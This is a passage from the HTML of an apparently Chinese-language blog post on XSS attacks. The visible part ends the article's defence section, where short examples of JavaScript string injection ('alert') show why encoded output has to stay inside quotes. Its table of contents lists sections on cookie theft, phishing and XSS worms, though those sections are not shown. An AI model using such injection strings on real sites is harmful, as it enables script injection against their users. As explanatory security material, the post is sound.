+<p>var y = " 1 ; alert (2) " ;</p>
+</blockquote>
+<p>第一行执行额外的代码了；第二行则是安全的。</p>
+<p>对于第二行，攻击者即使想逃逸出引号的范围：<code> var y =&quot;\&quot;; alert(1)\/\/ &quot;</code></p>
+<p>所以JavascriptEncode的变量输出一定要在引号内。防止开发者忘了，只能使用一个更严格的JavascriptEncode函数来保证安全——除了数字、字母外的所有字符，都使用十六进制“\xHH” 的方式进行编码</p>
+</script></p>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2022/04/09/XSS%E6%94%BB%E5%87%BB/">XSS攻击</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
+        <p><span>发布时间:</span>2022-04-09, 15:30:39</p>
+        <p><span>最后更新:</span>2022-04-09, 23:29:25</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2022/04/09/XSS%E6%94%BB%E5%87%BB/" title="XSS攻击">https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2022/04/08/JWT%E5%9F%BA%E7%A1%80/">
+                    JWT基础知识
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB"><span class="toc-number">1.</span> <span class="toc-text">XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0XSS%E8%84%9A%E6%9C%AC"><span class="toc-number">1.2.</span> <span class="toc-text">构造XSS脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-%E5%88%86%E7%B1%BB"><span class="toc-number">1.3.</span> <span class="toc-text">XSS 分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">1.3.0.2.</span> <span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DOM-XSS"><span class="toc-number">1.3.0.3.</span> <span class="toc-text">DOM　XSS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.4.</span> <span class="toc-text">XSS利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Cookie%E7%AA%83%E5%8F%96"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">Cookie窃取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81"><span class="toc-number">1.4.0.2.</span> <span class="toc-text">会话劫持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%92%93%E9%B1%BC"><span class="toc-number">1.4.0.3.</span> <span class="toc-text">钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E9%92%93%E9%B1%BC"><span class="toc-number">1.4.0.3.1.</span> <span class="toc-text">重定向钓鱼</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HTML%E6%B3%A8%E5%85%A5%E5%BC%8F%E9%92%93%E9%B1%BC"><span class="toc-number">1.4.0.3.2.</span> <span class="toc-text">HTML注入式钓鱼</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#iframe%E9%92%93%E9%B1%BC"><span class="toc-number">1.4.0.3.3.</span> <span class="toc-text">iframe钓鱼</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E6%8C%82%E9%A9%AC"><span class="toc-number">1.4.0.4.</span> <span class="toc-text">网页挂马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS-Worm"><span class="toc-number">1.4.0.5.</span> <span class="toc-text">XSS Worm</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB%E6%8A%80%E5%B7%A7"><span class="toc-number">1.5.</span> <span class="toc-text">XSS攻击技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-number">1.6.</span> <span class="toc-text">XSS的防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E6%A3%80%E6%9F%A5"><span class="toc-number">1.6.1.</span> <span class="toc-text">输入检查</span></a></li></ol></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"XSS攻击　| KrismileBlog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section id="comments">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function(){
+            this.page.url = 'https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/';
+            this.page.identifier = '2022/04/09/XSS攻击/';
+        };
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = '//.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <script> loadComment(); </script>
+
+</section>
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2022/04/08/JWT%E5%9F%BA%E7%A1%80/" title="下一篇: JWT基础知识">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2022/04/09/XSS%E6%94%BB%E5%87%BB/">XSS攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/08/JWT%E5%9F%BA%E7%A1%80/">JWT基础知识</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016-2022 krismile
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+             categories: ".article-category a, a.tag-list-link", 
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
